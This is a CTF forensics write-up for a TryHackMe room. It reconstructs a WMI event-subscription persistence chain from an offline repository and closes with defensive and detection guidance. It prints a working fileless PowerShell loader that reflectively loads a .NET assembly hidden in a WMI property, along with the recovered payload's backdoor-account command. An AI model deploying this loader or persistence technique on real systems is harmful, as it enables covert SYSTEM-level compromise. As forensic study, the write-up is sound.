## CTF Writeup — "After Hours" WMI Fileless Persistence (TryHackMe)
### TryHackMe · Hacker Holidays Day 12 · Forensics/DFIR · one-line technique summary: carve a WMI event subscription out of a raw CIM repository, decode a fileless PowerShell loader, and recover the flag from an embedded .NET backdoor.

**Flag:** `THM{REDACTED}`

---

## TL;DR

The task drops five files with no extensions — `OBJECTS.DATA`, `INDEX.BTR`, and three `MAPPING*.MAP`. That is a raw **WMI CIM repository** lifted straight off a Windows host. Inside it lives a classic WMI event-subscription persistence: an `__EventFilter` named **EngineTelemetryFilter** that fires every hour at minute 30, bound to a **CommandLineEventConsumer** that launches `powershell.exe -enc <base64>`. Decoding the `-enc` blob reveals a **fileless loader** — it doesn't carry a payload, it *reads one back out of WMI* from a decoy class property `Win32_HardwareTelemetry.ConfigData`, base64-decodes it, raw-**Deflate**-decompresses it into a .NET assembly, and `Assembly.Load()`s it in memory. Carving that property value and inflating it yields a tiny .NET binary (`updates.exe`, namespace `AfterHours`). Its logic: only detonate on the host named `bytelotusdc`, then run `net user patch <base64> /add` to plant a local backdoor account. The account password is base64 — decode it and it *is* the flag: `THM{REDACTED}`.

---

## The attack chain

```
attachments.zip
   └── raw WMI CIM repository (OBJECTS.DATA, INDEX.BTR, MAPPING1-3.MAP)
          │
          │  carve string values out of OBJECTS.DATA
          ▼
   __EventFilter  "EngineTelemetryFilter"   (root\cimv2)
   WQL: __InstanceModificationEvent WITHIN 60
        WHERE TargetInstance ISA 'Win32_LocalTime'
          AND TargetInstance.Minute = 30      ← trigger: every hour at :30
          │
   __FilterToConsumerBinding  (glues filter → consumer)
          │
          ▼
   CommandLineEventConsumer
   cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <BASE64-UTF16LE>
          │
          │  base64-decode (UTF-16LE)  → PowerShell source
          ▼
   FILELESS LOADER:
     read  ROOT\cimv2:Win32_HardwareTelemetry . ConfigData   ← payload hidden in WMI, not on disk
     base64-decode → DeflateStream(Decompress) → byte[]
     [Reflection.Assembly]::Load(bytes).EntryPoint.Invoke()
          │
          │  carve ConfigData blob → base64-decode → raw inflate
          ▼
   .NET assembly  updates.exe  (namespace AfterHours)
     if (Environment.MachineName == "bytelotusdc") {
         cmd.exe /c  net user patch  VEhNe...fQ==  /add   ← backdoor account
     } else  "Execution halted: Environment mismatch."
          │
          │  base64-decode the account password
          ▼
   THM{REDACTED}
```

---

## Background: how WMI becomes a persistence and fileless-execution mechanism

**WMI (Windows Management Instrumentation)** is Windows' built-in management layer — the thing that answers questions like "how much RAM is free," "list running processes," "what time is it." It is organized like a tiny object database: **namespaces** (folders, e.g. `root\cimv2`), **classes** (object blueprints, e.g. `Win32_Process`), and **instances** (concrete objects). All of it — class definitions and instance data — is persisted to a single on-disk store, the **CIM repository**, at `C:\Windows\System32\wbem\Repository\`:

- **`OBJECTS.DATA`** — the actual object/instance data (the big file; where the loot is).
- **`INDEX.BTR`** — a B-tree index mapping object paths to their offsets inside `OBJECTS.DATA`.
- **`MAPPING1.MAP` / `MAPPING2.MAP` / `MAPPING3.MAP`** — page-mapping/transaction tables; Windows keeps up to three generations for crash consistency, and picks the newest valid one at boot.

WMI also has an **eventing** subsystem, and that is what attackers abuse. Three object types form a subscription:

1. **`__EventFilter`** — *what to watch for*, expressed as a WQL query (WMI's SQL dialect). Example: "notify me whenever the system clock's minute equals 30."
2. **`__EventConsumer`** — *what to do* when the filter fires. Several built-in consumer classes exist, and two are gold for attackers:
   - **`CommandLineEventConsumer`** — runs an arbitrary command line.
   - **`ActiveScriptEventConsumer`** — runs an arbitrary VBScript/JScript.
3. **`__FilterToConsumerBinding`** — the *glue* that ties a specific filter to a specific consumer.

Register all three and you have persistence that runs **as SYSTEM**, survives reboots, lives entirely inside a database file (no EXE dropped in `Startup`, no `Run` key, no scheduled task visible in the usual places), and is invisible to anyone not specifically looking at WMI subscriptions. This is MITRE ATT&CK **T1546.003 (Event Triggered Execution: WMI Event Subscription)**.

The second trick this room uses is **fileless payload storage**. WMI classes can carry static property values. An attacker can create (or hijack) a class — here a plausible-sounding decoy, `Win32_HardwareTelemetry` — and stuff a whole executable into a string property (`ConfigData`) as base64. Nothing ever touches disk as a PE file; the loader pulls the bytes out of the database at runtime and loads them straight into memory with .NET reflection. This is **T1047 / T1027** territory: the malware and its config both live in the same repository, disguised as telemetry.

For DFIR, the key realization is: you rarely have a live host. You have *the repository files*, offline. So the whole job is to **parse or carve those files** and reconstruct the subscription and its payload without ever running anything.

## Scope note

THM-provisioned artifact. The `attachments.zip` (a WMI repository export) was downloaded and analyzed **offline** on the analysis workstation — no code from the sample was executed. Where a Kali/attackbox is referenced elsewhere in this series, none was needed here; this room is pure static forensics.

---

## Step 1 — Identify what the files actually are

Unzip and list:

```bash
mkdir day12 && cd day12
unzip -o ../attachments-1784136288483.zip
ls -la
# INDEX.BTR      5.0 MB
# MAPPING1.MAP   ~78 KB
# MAPPING2.MAP   ~78 KB
# MAPPING3.MAP   ~78 KB
# OBJECTS.DATA    24 MB
```

The filename set is an instant fingerprint. `OBJECTS.DATA` + `INDEX.BTR` + `MAPPINGn.MAP` = a Windows CIM repository, no other software produces exactly this layout. That single observation reframes the entire task from "unknown blobs" into "hunt a WMI event subscription."

Why not just import it into a live WMI and query it? Because that would (a) require a matching Windows build and (b) risk *running* the persistence. Offline carving is both safer and faster.

## Step 2 — Confirm a WMI subscription is present

WMI stores class *names* in `OBJECTS.DATA` as plain ASCII, while instance *string values* are typically UTF-16LE. A quick keyword count over the ASCII view (`strings` wasn't available on the box, so a two-line Python decoder stood in) confirms the whole subscription machinery is present:

```python
import re
data = open('OBJECTS.DATA','rb').read()
txt  = data.decode('latin1')           # class names live here as ASCII
for kw in ['CommandLineEventConsumer','ActiveScriptEventConsumer',
           '__EventFilter','FilterToConsumerBinding','CommandLineTemplate']:
    print(kw, len(re.findall(re.escape(kw), txt, re.I)))
# CommandLineEventConsumer  18
# ActiveScriptEventConsumer 10
# __EventFilter              8
# FilterToConsumerBinding    2
# CommandLineTemplate        5
```

**Reading the counts correctly matters here.** Most of those hits are *class definitions* — the schema for what a `CommandLineEventConsumer` is — which ship with every Windows install and are noise. What we want are the **instances** the attacker created: a filter with a real WQL string, a consumer with a real command line, and a binding between them. So the next step is to stop counting and go read the actual string values.

## Step 3 — Recover the filter (the trigger)

Searching `OBJECTS.DATA` for a WQL `SELECT` string lands directly on the attacker's `__EventFilter` instance:

```
__EventFilter  root\cimv2  EngineTelemetryFilter
SELECT * FROM __InstanceModificationEvent
  WITHIN 60
  WHERE TargetInstance ISA 'Win32_LocalTime'
    AND TargetInstance.Minute = 30
  (Language: WQL)
```

Decoding it in plain English:

- **`__InstanceModificationEvent`** — an *intrinsic* event that fires whenever any WMI instance changes.
- **`WITHIN 60`** — poll for that change every 60 seconds (the polling interval; keeps CPU cost low).
- **`TargetInstance ISA 'Win32_LocalTime'`** — but only care about changes to the system-clock object. `Win32_LocalTime` "changes" every minute as the clock advances, so this is effectively a per-minute heartbeat.
- **`TargetInstance.Minute = 30`** — and only fire when the new minute value is exactly 30.

Net effect: the payload runs **once an hour, at HH:30**. The name `EngineTelemetryFilter` is deliberate camouflage — it reads like a legitimate performance-telemetry hook.

Using `Win32_LocalTime` as a clock trigger is a well-known persistence idiom precisely because it looks mundane and needs no external event.

## Step 4 — Recover the consumer (the action)

The paired `CommandLineEventConsumer` instance carries the command line:

```
CommandLineEventConsumer
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...<1320 base64 chars>
```

Flag-by-flag, this is a textbook stealth PowerShell launch:

- **`cmd /C`** — run and exit; wrapping in `cmd` avoids some argument-parsing quirks of the consumer.
- **`-Sta`** — single-threaded apartment (needed by some COM/UI calls).
- **`-Nop`** (`-NoProfile`) — skip the user's PowerShell profile so nothing logs or interferes.
- **`-Window Hidden`** — no visible window.
- **`-enc`** (`-EncodedCommand`) — the script that follows is **base64 of the UTF-16LE** script text. This is the single most common obfuscation for PowerShell in the wild: it hides quotes/spaces from logging and casual inspection.

The `__FilterToConsumerBinding` instance (also present) is what actually activates the pair — a filter and a consumer do nothing until a binding references both.

## Step 5 — Decode the `-enc` loader

`-EncodedCommand` is just base64 of UTF-16LE. Decode it:

```python
import re, base64
b64 = re.search(rb'-enc ([A-Za-z0-9+/=]{20,})', data).group(1)
print(base64.b64decode(b64).decode('utf-16le'))
```

Output — annotated:

```powershell
# 1) Read a base64 string OUT of a WMI class property. The payload is not on disk;
#    it lives inside this same repository, in a decoy "telemetry" class.
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;

# 2) Base64 -> bytes, then RAW DEFLATE decompress (DeflateStream = no zlib/gzip header).
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
        [IO.MemoryStream][Convert]::FromBase64String($file),
        [IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while ($r -gt 0) { $o.Write($b,0,$r); $r = $d.Read($b,0,1024); }

# 3) The decompressed bytes are a .NET assembly. Load it straight into memory and
#    invoke its entry point — nothing is ever written to disk.
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
```

This is the crux of the "fileless" design. The consumer's command line is small and innocuous-looking; the *real* malware is a compressed .NET executable parked in `Win32_HardwareTelemetry.ConfigData`. To finish the analysis we have to carve **that** property value and reverse the compression.

## Step 6 — Carve and inflate the hidden .NET assembly

Locate the decoy class property and grab its (long) base64 value:

```python
i = data.find(b'Win32_HardwareTelemetry')     # property ConfigData sits right after
# the ConfigData value is the large base64 blob beginning "7VZPbFRFGP..."
blob = re.findall(rb'7VZPbFRFGP[A-Za-z0-9+/]+={0,2}', data)[0]   # ~2212 chars
```

Now reverse exactly what the loader does — base64, then **raw** Deflate. The important detail: PowerShell's `DeflateStream` is *raw* DEFLATE with **no** zlib/gzip header, which in Python is `zlib.decompress(raw, -15)` (a negative window-bits value selects headerless mode). Getting this wrong is the usual stumbling block — `gzip` or default `zlib.decompress` both fail on this stream:

```python
import zlib
raw = base64.b64decode(blob)
pe  = zlib.decompress(raw, -15)      # -15 = raw DEFLATE, no header
open('payload.exe','wb').write(pe)
print(len(pe), pe[:2])               # 4096  b'MZ'
```

```bash
file payload.exe
# PE32 executable ... Intel i386 Mono/.Net assembly, 3 sections
```

A 4 KB **.NET assembly** falls out. `MZ` magic confirms a valid PE; `file` confirms it's managed (.NET).

## Step 7 — Reverse the assembly and extract the flag

The binary is tiny, so no full decompiler is needed — the .NET **metadata string heaps** hold everything. Two heaps matter: `#Strings` (identifier names, ASCII) and `#US` (user strings — the literals the code actually uses, **UTF-16LE**). Dump both:

```python
d = open('payload.exe','rb').read()
# ASCII identifiers (#Strings):
#   updates.exe, Program, AfterHours, Main, Environment, get_MachineName,
#   StringComparison, Equals, ProcessStartInfo, set_FileName, set_Arguments,
#   ProcessWindowStyle, set_WindowStyle, set_CreateNoWindow, Process, Start, Console, WriteLine
# UTF-16LE literals (#US):
t = d.decode('utf-16le','ignore')
#   'bytelotusdc'
#   'cmd.exe'
#   '/c net user patch REDACTED /add'
#   'Execution halted: Environment mismatch.'
```

Reconstructing the logic from the identifiers + literals (namespace `AfterHours`, class `Program.Main`):

```csharp
// pseudo-reconstruction
if (Environment.MachineName.Equals("bytelotusdc", StringComparison.OrdinalIgnoreCase)) {
    var psi = new ProcessStartInfo {
        FileName        = "cmd.exe",
        Arguments       = "/c net user patch REDACTED /add",
        WindowStyle     = ProcessWindowStyle.Hidden,
        CreateNoWindow  = true,
    };
    Process.Start(psi);
} else {
    Console.WriteLine("Execution halted: Environment mismatch.");
}
```

Two defensive/analysis-relevant behaviors:

- **Environment keying.** The payload only detonates on the host named **`bytelotusdc`** (the domain controller, per the name). On any sandbox or analyst VM it just prints *"Execution halted: Environment mismatch."* and exits. This is a guardrail/anti-analysis technique (ATT&CK **T1480 Execution Guardrails**): detonate only on the intended victim. Because we're reading the code statically, the guard is irrelevant to us — we don't need to satisfy it.
- **The action.** `net user patch <base64> /add` creates a **local backdoor account** called `patch` (again, a benign-sounding name — "just a patch account"). The account's password is supplied as base64.

Decode the password and it's the flag:

```bash
python -c "import base64;print(base64.b64decode('REDACTED').decode())"
# THM{REDACTED}
```

**Flag:** `THM{REDACTED}`

The flag doubles as the story: the innocuously named **`patch`** account is exactly what "opened the backdoor."

---

## Root cause

Nothing here is a memory-corruption bug or an exploited CVE — it is **abuse of a legitimate, powerful Windows feature by an actor who already had admin/SYSTEM**. WMI event subscriptions are a supported administration mechanism; the room weaponizes three of their properties:

1. **Autonomous, SYSTEM-level execution** from a filter/consumer/binding triple, triggered off the clock (`Win32_LocalTime.Minute = 30`) so it needs no external event and reruns hourly.
2. **Fileless storage** — the real payload (a .NET assembly) is compressed and hidden inside a *decoy WMI class property* (`Win32_HardwareTelemetry.ConfigData`), so disk-based AV and file-hash IOCs see nothing.
3. **In-memory reflective load** — `[Reflection.Assembly]::Load()` runs the managed payload without it ever existing as a file, defeating write-time file scanning.

Everything is dressed in believable telemetry names (`EngineTelemetryFilter`, `Win32_HardwareTelemetry`, `patch`) to survive a casual eyeball pass.

## Defensive takeaways

- **Baseline and monitor WMI subscriptions.** Legit persistent `__EventFilter` / `CommandLineEventConsumer` / `ActiveScriptEventConsumer` / `__FilterToConsumerBinding` instances are rare on most hosts. Enumerate them regularly:
  ```powershell
  Get-WmiObject -Namespace root\subscription -Class __EventFilter
  Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
  Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer
  Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
  ```
  Any consumer that shells out to `powershell -enc`, `cmd /c`, or an ActiveScript body is high-signal.
- **Treat `-EncodedCommand` as suspicious by default**, especially spawned by `WmiPrvSE.exe` (the WMI provider host) or `scrcons.exe` (the script-consumer host). Legit admin scripts rarely need to base64-hide themselves.
- **Constrain PowerShell.** Constrained Language Mode + application control (WDAC/AppLocker) blocks `Reflection.Assembly::Load` of arbitrary bytes, which breaks this exact loader.
- **Watch custom/oddly-named WMI classes** carrying large base64 string properties — that pattern (`Win32_HardwareTelemetry.ConfigData` here) is payload storage, not telemetry.
- **Alert on `net user … /add` / `net localgroup administrators … /add`**, particularly when the parent is `WmiPrvSE.exe`/`scrcons.exe` rather than an interactive admin session.

## Detection opportunities

- **WMI-Activity operational log** (`Microsoft-Windows-WMI-Activity/Operational`) — records filter/consumer registrations and firings.
- **Sysmon** — Event IDs **19 (WmiEventFilter)**, **20 (WmiEventConsumer)**, **21 (WmiEventConsumerToFilter)** are purpose-built for exactly this persistence, plus **ID 1** for the `powershell.exe -enc` process create and its parentage.
- **Script Block Logging** (Event ID 4104) deobfuscates `-enc` payloads at runtime — it would have logged the decompress-and-`Assembly::Load` loader in cleartext.
- **Security 4720** (a user account was created) catches the `net user patch /add` result.
- **Offline / IR**: parse the repository directly. Tools that do this without a live host include FireEye/Mandiant **flare-wmi (`python-cim`)**, **PyWMIPersistenceFinder.py**, and **WMIParser**. Manual carving (as done above) works too when tooling isn't available.

## Command cheat-sheet

```bash
# 1. Identify the artifact
unzip attachments.zip && ls        # OBJECTS.DATA, INDEX.BTR, MAPPING1-3.MAP  => WMI CIM repo

# 2. Confirm a subscription (ASCII class names) and read instance strings (UTF-16LE values)
python -c "import re;d=open('OBJECTS.DATA','rb').read();print([k for k in ['__EventFilter','CommandLineEventConsumer','FilterToConsumerBinding'] if k.encode() in d])"

# 3. Recover trigger (WQL) and action (command line) — grep OBJECTS.DATA for 'SELECT * FROM' and 'powershell.exe -enc'

# 4. Decode the -enc loader (base64 of UTF-16LE)
python -c "import base64;print(base64.b64decode(OPEN_ENC).decode('utf-16le'))"

# 5. Carve the hidden payload from Win32_HardwareTelemetry.ConfigData, base64 + RAW deflate
python - <<'PY'
import re,base64,zlib
d=open('OBJECTS.DATA','rb').read()
blob=re.findall(rb'7VZPbFRFGP[A-Za-z0-9+/]+={0,2}',d)[0]
open('payload.exe','wb').write(zlib.decompress(base64.b64decode(blob),-15))  # -15 = raw DEFLATE
PY

# 6. Reverse the .NET assembly (metadata string heaps) and decode the flag
python -c "import base64;print(base64.b64decode('REDACTED').decode())"
```

## Two things worth remembering

- **When the "malware" is missing, it's in the config.** A loader that carries no payload is telling you the payload lives somewhere else — here, base64-compressed inside a decoy WMI class property. Fileless doesn't mean payload-less; it means "look in the database, the registry, or an env var, not on disk."
- **Reverse the exact transform, header and all.** The single thing that blocks most people on this room is `DeflateStream` being *raw* DEFLATE (`zlib.decompress(data, -15)`), not zlib and not gzip. Matching the loader's decode step precisely — right base64 charset, right compression variant, right string encoding for `#US` — is the whole game in fileless analysis.

*Target/users/credentials are fictional challenge material; the WMI repository was analyzed offline and no sample code was executed.*
